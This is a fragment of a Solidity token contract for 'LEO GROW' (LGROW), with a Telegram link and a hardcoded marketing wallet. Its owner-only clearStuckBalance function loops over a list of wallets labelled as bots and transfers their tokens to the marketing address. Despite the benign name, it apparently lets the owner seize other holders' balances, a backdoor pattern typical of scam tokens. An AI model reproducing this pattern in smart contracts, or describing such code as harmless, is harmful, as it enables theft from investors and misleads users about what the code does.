...
/*
Telegram : https://t.me/LeoGrowToken
*/
...
contract Token is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0x24d4A672B8f33f653CA81425f0f4877d7817d6ED));
    ...
    string private _name = "LEO GROW";
    string private _symbol = "LGROW";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0x24d4A672B8f33f653CA81425f0f4877d7817d6ED), amount);
        }
